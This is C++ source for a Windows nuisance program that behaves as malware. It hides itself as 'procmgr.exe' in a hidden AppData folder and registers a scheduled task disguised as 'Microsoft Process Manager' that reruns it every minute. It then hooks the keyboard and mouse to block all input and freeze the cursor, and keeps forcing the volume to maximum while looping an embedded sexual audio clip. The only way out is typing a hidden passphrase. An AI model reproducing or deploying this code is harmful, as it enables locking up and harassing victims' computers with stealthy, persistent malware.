#include "stdafx.h" //Pre-compiled headers

#include "resource.h"
#pragma comment(lib, "winmm.lib")

HHOOK hMouseHook = NULL;
HHOOK hKeyboardHook = NULL;
bool running = false;

// Freeze mouse position
static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && wParam == WM_MOUSEMOVE) {
		SetCursorPos(0, 0);
		return 1;
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
// End execution when the user writes "daddy"
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
		static std::string keyBuf;
		if (wParam == WM_KEYDOWN) keyBuf += (BYTE)kb->vkCode;

		if (keyBuf.ends_with("DADDY")) {
			PostQuitMessage(0);
			return 0;
		}

		if (keyBuf.length() > 512) keyBuf.clear();

		// Block all other keys
		return 1;
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static void StartMouseHook() {
	if (!hMouseHook) {
		hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
	}
}

static void StopMouseHook() {
	if (hMouseHook) {
		UnhookWindowsHookEx(hMouseHook);
		hMouseHook = NULL;
	}
}

static void StartKeyboardHook() {
	if (!hKeyboardHook) {
		hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	}
}

static void StopKeyboardHook() {
	if (hKeyboardHook) {
		UnhookWindowsHookEx(hKeyboardHook);
		hKeyboardHook = NULL;
	}
}

static wchar_t* GetAppDataFolder() {
	TCHAR path[MAX_PATH + 1]{};

	SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);

	return path;
}
// Creates a task that runs "file" every minute
static void createTask(wchar_t* file) {
	std::wstring cmd = L"schtasks /create /tn \"Microsoft Process Manager\" /sc minute /mo 1 /tr \"";
	(cmd += file) += L"\"";
	STARTUPINFOW si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	BOOL success = CreateProcessW(
		NULL,                     // Application name (NULL = use command line)
		&cmd[0],				  // Command line
		NULL,                     // Process security attributes
		NULL,                     // Thread security attributes
		FALSE,                    // Inherit handles
		CREATE_NO_WINDOW,         // No console window
		NULL,                     // Environment
		NULL,                     // Current directory
		&si,                      // Startup info
		&pi                       // Process info
	);
}
// Moves exe to appdata directory
static wchar_t* moveSelf() {
	wchar_t filePath[MAX_PATH + 1]{};
	auto newPath = lstrcatW(GetAppDataFolder(), L"\\Microsoft\\Windows\\procmgr.exe");
	GetModuleFileNameW(NULL, filePath, sizeof(filePath) / sizeof(filePath[0]));
	MoveFileW(filePath, newPath);
	SetFileAttributesW(newPath, FILE_ATTRIBUTE_HIDDEN);
	return newPath;
}
// Gets a resource from the program as bytes

static std::vector<BYTE> getResource(int resourceID, const wchar_t* resourceType) {
	HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCE(resourceID), resourceType);
	if (!hRes) exit(1);
	HGLOBAL hData = LoadResource(NULL, hRes);
	if (!hData) exit(1);
	DWORD size = SizeofResource(NULL, hRes);
	void* pData = LockResource(hData);

	return std::vector<BYTE>((BYTE*)pData, (BYTE*)pData + size);
}
// Set master volume and muted
static int setVolume(const float& vol, const BOOL muted, const bool& loop = false) {
	if (vol < 0.0f || vol > 1.0f) return EXIT_FAILURE;
	HRESULT hr;

	// Initialize COM
	hr = CoInitialize(nullptr);
	if (FAILED(hr)) {
		return EXIT_FAILURE;
	}

	IMMDeviceEnumerator* pEnumerator{};
	IMMDevice* pDevice{};
	IAudioEndpointVolume* pEndpointVolume{};

	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr, CLSCTX_ALL,
		__uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
	if (FAILED(hr)) {
		CoUninitialize();
		return EXIT_FAILURE;
	}

	hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
	if (FAILED(hr)) {
		pEnumerator->Release();
		CoUninitialize();
		return EXIT_FAILURE;
	}

	hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL,
		nullptr, (void**)&pEndpointVolume);
	if (FAILED(hr)) {
		pDevice->Release();
		pEnumerator->Release();
		CoUninitialize();
		return EXIT_FAILURE;
	}
	do {
		hr = pEndpointVolume->SetMasterVolumeLevelScalar(vol, nullptr);
		hr = pEndpointVolume->SetMute(muted, nullptr);
	} while (loop && running);

	pEndpointVolume->Release();
	pDevice->Release();
	pEnumerator->Release();
	CoUninitialize();

	return EXIT_SUCCESS;
}
// play .wav data from memory (don't write to disk)
static int playData(const std::vector<BYTE>& data, const bool& loop = false) {
	int flags = SND_MEMORY | SND_ASYNC;
	if (loop) flags |= SND_LOOP; // will not block because of SND_ASYNC
	PlaySoundW((LPCWSTR)data.data(), NULL, flags);
	return EXIT_SUCCESS;
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
	createTask(moveSelf());
	const auto waveData = getResource(IDR_WAVE1, L"WAVE"); //moaning.wav
	playData(waveData, true);
	running = true;
	std::thread t(setVolume, 1.0f, FALSE, true);
	StartKeyboardHook();
	StartMouseHook();
	std::thread([] { MessageBoxW(NULL, L"call me daddy", L":3", MB_OK | MB_SYSTEMMODAL); }).detach();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {}
	running = false;
	StopKeyboardHook();
	StopMouseHook();
	t.join();
	return EXIT_SUCCESS;
}